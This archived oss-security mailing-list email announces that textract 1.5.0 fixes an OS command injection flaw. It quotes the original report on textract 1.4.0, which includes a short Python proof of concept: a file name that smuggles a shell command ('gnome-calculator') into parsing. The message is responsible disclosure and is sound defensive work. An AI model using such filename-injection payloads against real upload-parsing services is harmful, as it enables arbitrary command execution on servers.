X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1197" "Thursday" "17" "November" "2016" "09:18:26" "-0500" "Pierre Ernst" "pernst@salesforce.com" "<CAO8=cJ9qRB4_4TMcES57a4+J-Fwf-ZzDNaLvq93JC7yNndBD2g@mail.gmail.com>" "57" "[oss-security] Re: CVE request - textract 1.4.0 - OS Command Injection" nil nil nil "11" "2016111714:18:26" "[oss-security] Re: CVE request - textract 1.4.0 - OS Command Injection" (number mark "U       pernst@sales Nov 17   57/1197  " thread-indent "\"[oss-security] Re: CVE request - textract 1.4.0 - OS Command Injection\"\n") "<CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>" ("<CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15418 invoked by uid 550); 17 Nov 2016 14:25:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9897 invoked from network); 17 Nov 2016 14:18:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=salesforce.com; s=google;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=VYuT86B8UMseIRI7HyK3BfL7bjtgM9N0eeMVvOG5exg=;
        b=A4jk/gp+ALq/zKv5+79b9ysbkmnVmKmggkYemO0c4pJlPCqG3udsvXaYIZqGPt+mwc
         YqbQOIqP/a6Bl9OvTvCpbr1CIotmLYGLurHPRvt6U+ktCGPRGFRyAMWij4/eh9ZGJ1oq
         czP8CH+CVZFmsdtuVISkJRnX5m3lNwTaheZ/M=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=VYuT86B8UMseIRI7HyK3BfL7bjtgM9N0eeMVvOG5exg=;
        b=XQOqNkHoXZXnJMKlIngFI7sCLODrI2mwbMYRF1vTkEpWPwgf48FTStRRfZi9kcmMSO
         9k/9wGABZy5cs3zP+o078ALCFv6CgQia+CAYqc+3c+SxGZKOBJKMQpY7vhRILVTlKmH2
         K4SOFhEVkoW0XrcWp0eVa2BAcUI4Mmvrr0AkvbH9YE0cuJsu7X4xkF/lSF06xS/eeUJL
         sI0GUVp8cOt2MsQ6E1vnaS6BhR8aR2avkvObY5anxKxvnlhztpqgr3xXEjPO867oFm3Z
         tAbJMFoydRiXsFDwVpdbrAm1Fd9YAmqJeHcullHh3bGsWgi79NGgZRb4VGBFGQgVUne+
         0AIg==
X-Gm-Message-State: ABUngvfjcDuYemig2pcV9v62Guihoj7xzf4t19VNNxIl7Wargp6BviOGxB+uWaKxDcs8dTdZCha9Gux7MbU5wtyz
X-Received: by 10.46.69.2 with SMTP id s2mr1438789lja.56.1479392307336; Thu,
 17 Nov 2016 06:18:27 -0800 (PST)
MIME-Version: 1.0
In-Reply-To: <CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>
References: <CAO8=cJ-0zddSyndp=8ot8BHxyeC2r0Ln0nQvbFx0JQ3Dpg=0dA@mail.gmail.com>
From: Pierre Ernst <pernst@salesforce.com>
Date: Thu, 17 Nov 2016 09:18:26 -0500
Message-ID: <CAO8=cJ9qRB4_4TMcES57a4+J-Fwf-ZzDNaLvq93JC7yNndBD2g@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a114b072cf6a0d405417fdc8e
Subject: [oss-security] Re: CVE request - textract 1.4.0 - OS Command Injection

--001a114b072cf6a0d405417fdc8e
Content-Type: text/plain; charset=UTF-8

Version 1.5.0 includes a fix for this

https://github.com/deanmalmgren/textract/releases/tag/v1.5.0


On Thu, Oct 20, 2016 at 5:40 PM, Pierre Ernst <pernst@salesforce.com> wrote:

> The Python textract component (https://github.com/
> deanmalmgren/textract/tree/v1.4.0) is vulnerable to OS command injection.
>
> this fork contains a fix:
> https://github.com/pierre-ernst/textract
>
>
> Parsing a file with a malicious name leads to arbitrary OS command
> injection, this is especially risky when parsing user-supplied files on a
> server (e.g. uploaded files)
>
> PoC:
>
> import textract
> import sys
> import os
>
> # create a file with a malicious name and arbitrary content
> fileName = './test";gnome-calculator;#.pdf'
> file = open(fileName,'w+')
> file.write('Pierre Ernst, Salesforce')
> file.close()
>
> # parse newly created file
> text = textract.process(fileName)
> print text
>
> # cleanup
> os.remove(fileName);
>
>
> --
> Pierre Ernst
> Salesforce
>
>


-- 
Pierre Ernst
Senior Application Security Engineer
M&A Security
Salesforce.com
mobile: +1 613-404-1450
timezone: EDT

--001a114b072cf6a0d405417fdc8e--
